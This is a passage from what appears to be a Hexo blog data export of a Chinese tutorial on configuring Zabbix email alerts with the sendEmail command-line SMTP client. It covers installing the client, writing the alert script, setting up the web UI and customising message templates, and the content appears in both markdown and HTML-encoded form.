点击默认的动作\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/10.png)\n点击操作->编辑\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/11.png)\n修改持续时间为60秒\n修改步骤为3,表示触发3次动作\n选择用户Admin\n选择仅送到sendEmail.sh\n点击更新\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/12.png)\n点击更新\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/13.png)\n解释:默认的步骤是1-1,也即是从1开始到1结束。一旦故障发生，就是执行sendEmail.sh脚本发生报警邮件给Admin用户和zabbix administrator组。\n假如故障持续了1个小时，它也只发送一次。如果改成1-0，0是表示不限制.无限发送\n间隔就是默认持续时间60秒。那么一个小时，就会发送60封邮件。\n如果需要短信报警的话,可以再创建一条新的动作，选择短信脚本。\n\n---\n\n### 邮件测试及模板修改\n\n下面开始测试邮件报警\n先添加一台主机test，不存在的IP地址\n等待几分钟，可以看到是红色状态\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/14.png)\n等待几分钟，就会收到邮件报警了\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/15.png)\n点击报表->动作日志 可以看到触发动作的次数。只会有3次，除非test主机状态改变，也就是正常的时候，会触发一次,否则不会再触发。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/16.png)\n大家可以看到邮件里面内容都堆到一起了，没有换行，且是英文，可以自行修改【组态-动作-动作】里的配置。\n\n下面是我修改后的配置信息:\n```bash\n====================================================\n\n# 默认接收人:\n\n故障{TRIGGER.STATUS}，服务器【{HOST.NAME1}】发生【 {TRIGGER.NAME}】故障！\n\n====================================================\n\n# 默认信息:\n\n告警主机:{HOST.NAME1}<br/>\n\n告警时间:{EVENT.DATE} {EVENT.TIME}<br/>\n\n告警等级:{TRIGGER.SEVERITY}<br/>\n\n告警信息: {TRIGGER.NAME}<br/>\n\n告警项目:{TRIGGER.KEY1}<br/>\n\n问题详情:{ITEM.NAME}:{ITEM.VALUE}<br/>\n\n当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}<br/>\n\n事件ID:{EVENT.ID}<br/>\n\n====================================================\n\n# 恢复主旨:\n\n恢复{TRIGGER.STATUS}，服务器【{HOST.NAME1}】故障【 {TRIGGER.NAME}】已恢复！\n\n====================================================\n\n# 恢复信息:\n\n告警主机:{HOST.NAME1}<br/>\n\n告警时间:{EVENT.DATE} {EVENT.TIME}<br/>\n\n告警等级:{TRIGGER.SEVERITY}<br/>\n\n告警信息: {TRIGGER.NAME}<br/>\n\n告警项目:{TRIGGER.KEY1}<br/>\n\n问题详情:{ITEM.NAME}:{ITEM.VALUE}<br/>\n\n当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}<br/>\n\n事件ID:{EVENT.ID}<br/>\n```\n\n更改后，收到的邮件样式如下：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/17.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/18.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/19.png)","slug":"zabbix邮件报警","published":1,"updated":"2016-11-21T03:57:10.574Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruldc003ogwtm8i8cl5zr","content":"<h3 id=\"&#x793A;&#x8B66;&#x5A92;&#x4ECB;\"><a href=\"#&#x793A;&#x8B66;&#x5A92;&#x4ECB;\" class=\"headerlink\" title=\"&#x793A;&#x8B66;&#x5A92;&#x4ECB;\"></a>&#x793A;&#x8B66;&#x5A92;&#x4ECB;</h3><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;zabbix&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x90FD;&#x914D;&#x7F6E;&#x4E86;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x88AB;&#x89E6;&#x53D1;&#x53D1;&#x9001;&#x6D88;&#x606F;&#x7ED9;&#x8FD0;&#x7EF4;&#xFF0C;&#x9700;&#x8981;&#x4E2D;&#x95F4;&#x4ECB;&#x8D28;&#x6765;&#x63A5;&#x6536;&#x5E76;&#x4F20;&#x9012;&#x6D88;&#x606F;&#x3002;</p>\n<p>zabbix&#x9ED8;&#x8BA4;&#x7684;&#x3010;&#x793A;&#x8B66;&#x5A92;&#x4ECB;&#x7C7B;&#x578B;&#x3011;&#x6709;&#x4E09;&#x79CD;&#xFF0C;Email&#x3001;Jabber&#x3001;SMS&#x3002;<br>&#xFF08;1&#xFF09;Email&#xFF1A;&#x4F7F;&#x7528;sendmail&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x4ECE;&#x8FD9;&#x8FB9;&#x51FA;&#x53BB;&#x7684;&#x90AE;&#x4EF6;&#x57FA;&#x672C;&#x662F;&#x5783;&#x573E;&#x90AE;&#x4EF6;&#x3002;<br>&#xFF08;2&#xFF09;SMS&#xFF1A;&#x9700;&#x8981;&#x77ED;&#x4FE1;&#x8BBE;&#x5907;&#xFF0C;&#x6CA1;&#x6709;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x7528;&#x8FC7;&#x8FD9;&#x4E1C;&#x897F;<br>&#xFF08;3&#xFF09;Jabber:Jabber&#x6709;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#xFF0C;&#x80FD;&#x8BA9;Jabber&#x7528;&#x6237;&#x548C;MSN&#x3001;YahooMessager&#x3001;ICQ&#x7B49;IM&#x7528;&#x6237;&#x76F8;&#x4E92;&#x901A;&#x8BAF;&#x3002;&#x56E0;&#x4E3A;Google&#x9075;&#x4ECE;Jabber&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E14;Google&#x5DF2;&#x7ECF;&#x5C06;Gtalk&#x7684;&#x670D;&#x52A1;&#x5668;&#x5F00;&#x653E;&#x7ED9;&#x4E86;&#x5176;&#x5B83;&#x7684;Jabber&#x670D;&#x52A1;&#x5668;&#x3002;&#x6240;&#x4EE5;PSI&#x3001;Giam&#x7B49;Jabber&#x5BA2;&#x6237;&#x7AEF;&#x8F6F;&#x4EF6;&#x652F;&#x6301;GTalk&#x7528;&#x6237;&#x767B;&#x9646;&#x3002;&#x56FD;&#x5185;&#x6CA1;&#x5565;&#x4EBA;&#x7528;&#x3002;</p>\n<p>sendEmail&#x662F;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x7684;SMTP&#x90AE;&#x4EF6;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x884C;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;sendEmail&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#x3002;sendEmail&#x4F7F;&#x7528;&#x7B80;&#x5355;&#x5E76;&#x4E14;&#x529F;&#x80FD;&#x5F3A;&#x5927;&#x3002;&#x8FD9;&#x4E2A;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x5728;php&#x3001;perl&#x548C;web&#x7AD9;&#x70B9;&#x4F7F;&#x7528;&#x3002;<strong>&#x8BF7;&#x6CE8;&#x610F;&#xFF0C;&#x4E0D;&#x662F;sendmail&#x3002;</strong></p>\n<hr>\n<h3 id=\"sendEmail&#x5B89;&#x88C5;\"><a href=\"#sendEmail&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"sendEmail&#x5B89;&#x88C5;\"></a>sendEmail&#x5B89;&#x88C5;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x4E0B;&#x8F7D;&#x8F6F;&#x4EF6;</span></span><br><span class=\"line\">wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># &#x89E3;&#x538B;&#x8F6F;&#x4EF6;</span></span><br><span class=\"line\"><span class=\"comment\"># tar zxvf sendEmail-v1.56.tar.gz</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FDB;&#x5165;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /usr/src/sendEmail-v1.56</span><br><span class=\"line\"><span class=\"comment\"># &#x521B;&#x5EFA;&#x76EE;&#x5F55;</span></span><br><span class=\"line\">mkdir /usr/<span class=\"built_in\">local</span>/bin</span><br><span class=\"line\"><span class=\"comment\"># &#x590D;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6743;&#x9650;</span></span><br><span class=\"line\">cp <span class=\"_\">-a</span> sendEmail /usr/<span class=\"built_in\">local</span>/bin</span><br><span class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/sendEmail</span><br><span class=\"line\"><span class=\"comment\"># &#x5B89;&#x88C5;&#x7EC4;&#x4EF6;</span></span><br><span class=\"line\">yum install perl-Net-SSLeay perl-IO-Socket-SSL -y</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<hr>\n<h3 id=\"zabbix-server&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix-server&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix server&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix server&#x7AEF;&#x914D;&#x7F6E;</h3><p>&#x8FDB;&#x5165;zabbix&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6307;&#x5B9A;&#x76EE;&#x5F55;<br>&#x53EF;&#x4EE5;&#x67E5;&#x770B;zabbix_server.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;AlertScriptsPath&#x53D8;&#x91CF;&#x662F;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p>\n<p>&#x8FDB;&#x5165;&#x76F8;&#x5173;&#x76EE;&#x5F55;<br>cd /usr/lib/zabbix/alertscripts</p>\n<p>&#x65B0;&#x5EFA;sendEmail.sh&#x811A;&#x672C;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span><br><span class=\"line\"></span></span><br><span class=\"line\">to=<span class=\"variable\">$1</span></span><br><span class=\"line\">subject=<span class=\"variable\">$2</span></span><br><span class=\"line\">body=<span class=\"variable\">$3</span></span><br><span class=\"line\">/usr/<span class=\"built_in\">local</span>/bin/sendEmail  <span class=\"_\">-f</span> a@domain.com -t <span class=\"string\">&quot;<span class=\"variable\">$to</span>&quot;</span> <span class=\"_\">-s</span> smtp.exmail.qq.com -u <span class=\"string\">&quot;<span class=\"variable\">$subject</span>&quot;</span> -o message-content-type=html -o message-charset=utf8 -xu a@domain.com -xp password -m <span class=\"string\">&quot;<span class=\"variable\">$body</span>&quot;</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>a@domain.com &#x8868;&#x793A;&#x53D1;&#x4EF6;&#x4EBA;&#x90AE;&#x7BB1;<br>smtp.exmail.qq.com &#x8868;&#x793A;&#x90AE;&#x7BB1;&#x7684;smtp&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD9;&#x91CC;&#x7528;&#x7684;&#x662F;&#x817E;&#x8BAF;&#x90AE;&#x7BB1;&#x3002;<br>password &#x8868;&#x793A;&#x53D1;&#x4EF6;&#x4EBA;&#x90AE;&#x7BB1;&#x5BC6;&#x7801;</p>\n</blockquote>\n<p>&#x7F16;&#x8F91;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x7ED9;&#x811A;&#x672C;&#x6743;&#x9650;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x sendEmail.sh</span><br><span class=\"line\">chown zabbix.zabbix sendEmail.sh</span><br></pre></td></tr></table></figure></p>\n<p>&#x624B;&#x52A8;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x811A;&#x672C;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x53C2;&#x6570;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x63A5;&#x6536;&#x4EBA;&#xFF0C;&#x4E3B;&#x9898;&#xFF0C;&#x5185;&#x5BB9;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./sendEmail.sh c@domain.com <span class=\"built_in\">test</span> 123</span><br></pre></td></tr></table></figure></p>\n<p>&#x767B;&#x5F55;c@domain.com&#x7684;&#x8D26;&#x6237;&#xFF0C;&#x67E5;&#x770B;&#x90AE;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6536;&#x5230;<br>&#x5982;&#x679C;&#x811A;&#x672C;&#x6267;&#x884C;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#xFF0C;&#x6536;&#x4E0D;&#x5230;&#x90AE;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;&#x8BF7;&#x68C0;&#x67E5;linux&#x7F51;&#x7EDC;&#x95EE;&#x9898;,iptables&#x3001;selinux&#x662F;&#x5426;&#x5173;&#x95ED;&#x3002;</p>\n<hr>\n<h3 id=\"zabbix-web&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix-web&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix web&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix web&#x7AEF;&#x914D;&#x7F6E;</h3><p>&#x8FDB;&#x5165;zabbix&#x7BA1;&#x7406;&#x9875;&#x9762;<br>&#x70B9;&#x51FB;&#x7BA1;&#x7406;-&gt;&#x62A5;&#x8B66;&#x5A92;&#x4ECB;&#x7C7B;&#x578B; &#x70B9;&#x51FB;&#x6700;&#x53F3;&#x8FB9;&#x7684;&#x521B;&#x5EFA;&#x5A92;&#x4F53;&#x7C7B;&#x578B;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/1.png\" alt=\"\"><br>&#x8F93;&#x5165;&#x811A;&#x672C;&#x540D;&#x79F0;&#xFF0C;&#x7C7B;&#x578B;&#x9009;&#x62E9;&#x811A;&#x672C;<br>&#x6DFB;&#x52A0;&#x4EE5;&#x4E0B;3&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x5BF9;&#x5E94;sendEmail.sh&#x811A;&#x672C;&#x9700;&#x8981;&#x7684;3&#x4E2A;&#x53C2;&#x6570;&#xFF1A;&#x6536;&#x4EF6;&#x4EBA;&#x5730;&#x5740;&#x3001;&#x4E3B;&#x9898;&#x3001;&#x8BE6;&#x7EC6;&#x5185;&#x5BB9;<br>{ALERT.SENDTO}<br>{ALERT.SUBJECT}<br>{ALERT.MESSAGE}</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/2.png\" alt=\"\"><br>&#x89E3;&#x91CA;:&#x5F88;&#x591A;&#x4EBA;&#x5B89;&#x88C5;zabbix 3.0&#x4E4B;&#x540E;&#xFF0C;&#x5199;&#x7684;&#x811A;&#x672C;&#x4E00;&#x76F4;&#x53D1;&#x4FE1;&#x4E0D;&#x6210;&#x529F;,&#x624B;&#x52A8;&#x6267;&#x884C;&#x65F6;&#x53EF;&#x4EE5;&#x7684;&#x3002;<br>&#x90A3;&#x662F;&#x56E0;&#x4E3A;zabbix3.0&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x53C2;&#x6570;&#x4E86;&#x3002;&#x6240;&#x4EE5;&#x4E0D;&#x5199;&#x53C2;&#x6570;&#xFF0C;&#x5B83;&#x662F;&#x4E0D;&#x4F1A;&#x4F20;&#x53C2;&#x6570;&#x7684;&#x3002;<br>&#x5728;2.x&#x7248;&#x672C;&#x4E0D;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x4F20;3&#x4E2A;&#x53C2;&#x6570;&#x3002;</p>\n<p>&#x70B9;&#x51FB;Admin&#x7528;&#x6237;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/3.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x6DFB;&#x52A0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/4.png\" alt=\"\"><br>&#x9009;&#x62E9;sendEmail.sh&#x811A;&#x672C;&#xFF0C;&#x8F93;&#x5165;&#x6536;&#x4EF6;&#x4EBA;&#x7684;&#x90AE;&#x7BB1;&#x5730;&#x5740;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/5.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x7528;&#x6237;&#x7FA4;&#x7EC4;&#xFF0C;&#x70B9;&#x51FB;zabbix administrator&#x540E;&#x9762;&#x7684;&#x8C03;&#x7528;&#x6A21;&#x5F0F;&#xFF0C;&#x70B9;&#x51FB;&#x4E00;&#x4E0B;&#xFF0C;&#x5C31;&#x542F;&#x7528;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/6.png\" alt=\"\"><br>&#x70B9;&#x6743;&#x9650;-&gt;&#x6DFB;&#x52A0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/7.png\" alt=\"\"></p>\n<p>&#x9009;&#x62E9;&#x6240;&#x6709;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/8.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x66F4;&#x65B0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/9.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x914D;&#x7F6E;-&gt;&#x52A8;&#x4F5C; &#x70B9;&#x51FB;&#x9ED8;&#x8BA4;&#x7684;&#x52A8;&#x4F5C;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/10.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x64CD;&#x4F5C;-&gt;&#x7F16;&#x8F91;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/11.png\" alt=\"\"><br>&#x4FEE;&#x6539;&#x6301;&#x7EED;&#x65F6;&#x95F4;&#x4E3A;60&#x79D2;<br>&#x4FEE;&#x6539;&#x6B65;&#x9AA4;&#x4E3A;3,&#x8868;&#x793A;&#x89E6;&#x53D1;3&#x6B21;&#x52A8;&#x4F5C;<br>&#x9009;&#x62E9;&#x7528;&#x6237;Admin<br>&#x9009;&#x62E9;&#x4EC5;&#x9001;&#x5230;sendEmail.sh<br>&#x70B9;&#x51FB;&#x66F4;&#x65B0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/12.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x66F4;&#x65B0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/13.png\" alt=\"\"><br>&#x89E3;&#x91CA;:&#x9ED8;&#x8BA4;&#x7684;&#x6B65;&#x9AA4;&#x662F;1-1,&#x4E5F;&#x5373;&#x662F;&#x4ECE;1&#x5F00;&#x59CB;&#x5230;1&#x7ED3;&#x675F;&#x3002;&#x4E00;&#x65E6;&#x6545;&#x969C;&#x53D1;&#x751F;&#xFF0C;&#x5C31;&#x662F;&#x6267;&#x884C;sendEmail.sh&#x811A;&#x672C;&#x53D1;&#x751F;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;Admin&#x7528;&#x6237;&#x548C;zabbix administrator&#x7EC4;&#x3002;<br>&#x5047;&#x5982;&#x6545;&#x969C;&#x6301;&#x7EED;&#x4E86;1&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x5B83;&#x4E5F;&#x53EA;&#x53D1;&#x9001;&#x4E00;&#x6B21;&#x3002;&#x5982;&#x679C;&#x6539;&#x6210;1-0&#xFF0C;0&#x662F;&#x8868;&#x793A;&#x4E0D;&#x9650;&#x5236;.&#x65E0;&#x9650;&#x53D1;&#x9001;<br>&#x95F4;&#x9694;&#x5C31;&#x662F;&#x9ED8;&#x8BA4;&#x6301;&#x7EED;&#x65F6;&#x95F4;60&#x79D2;&#x3002;&#x90A3;&#x4E48;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x9001;60&#x5C01;&#x90AE;&#x4EF6;&#x3002;<br>&#x5982;&#x679C;&#x9700;&#x8981;&#x77ED;&#x4FE1;&#x62A5;&#x8B66;&#x7684;&#x8BDD;,&#x53EF;&#x4EE5;&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x6761;&#x65B0;&#x7684;&#x52A8;&#x4F5C;&#xFF0C;&#x9009;&#x62E9;&#x77ED;&#x4FE1;&#x811A;&#x672C;&#x3002;</p>\n<hr>\n<h3 id=\"&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;\"><a href=\"#&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;\" class=\"headerlink\" title=\"&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;\"></a>&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;</h3><p>&#x4E0B;&#x9762;&#x5F00;&#x59CB;&#x6D4B;&#x8BD5;&#x90AE;&#x4EF6;&#x62A5;&#x8B66;<br>&#x5148;&#x6DFB;&#x52A0;&#x4E00;&#x53F0;&#x4E3B;&#x673A;test&#xFF0C;&#x4E0D;&#x5B58;&#x5728;&#x7684;IP&#x5730;&#x5740;<br>&#x7B49;&#x5F85;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x662F;&#x7EA2;&#x8272;&#x72B6;&#x6001;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/14.png\" alt=\"\"><br>&#x7B49;&#x5F85;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x5C31;&#x4F1A;&#x6536;&#x5230;&#x90AE;&#x4EF6;&#x62A5;&#x8B66;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/15.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x62A5;&#x8868;-&gt;&#x52A8;&#x4F5C;&#x65E5;&#x5FD7; &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x89E6;&#x53D1;&#x52A8;&#x4F5C;&#x7684;&#x6B21;&#x6570;&#x3002;&#x53EA;&#x4F1A;&#x6709;3&#x6B21;&#xFF0C;&#x9664;&#x975E;test&#x4E3B;&#x673A;&#x72B6;&#x6001;&#x6539;&#x53D8;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6B63;&#x5E38;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x6B21;,&#x5426;&#x5219;&#x4E0D;&#x4F1A;&#x518D;&#x89E6;&#x53D1;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/16.png\" alt=\"\"><br>&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x90AE;&#x4EF6;&#x91CC;&#x9762;&#x5185;&#x5BB9;&#x90FD;&#x5806;&#x5230;&#x4E00;&#x8D77;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x6362;&#x884C;&#xFF0C;&#x4E14;&#x662F;&#x82F1;&#x6587;&#xFF0C;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x4FEE;&#x6539;&#x3010;&#x7EC4;&#x6001;-&#x52A8;&#x4F5C;-&#x52A8;&#x4F5C;&#x3011;&#x91CC;&#x7684;&#x914D;&#x7F6E;&#x3002;</p>\n<p>&#x4E0B;&#x9762;&#x662F;&#x6211;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x914D;&#x7F6E;&#x4FE1;&#x606F;:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x63A5;&#x6536;&#x4EBA;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x6545;&#x969C;{TRIGGER.STATUS}&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x3010;{HOST.NAME1}&#x3011;&#x53D1;&#x751F;&#x3010; {TRIGGER.NAME}&#x3011;&#x6545;&#x969C;&#xFF01;</span><br><span class=\"line\"></span><br><span class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x4FE1;&#x606F;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4E3B;&#x673A;:{HOST.NAME1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x65F6;&#x95F4;:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x7B49;&#x7EA7;:{TRIGGER.SEVERITY}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4FE1;&#x606F;: {TRIGGER.NAME}&lt;br/&gt;</span><br><span 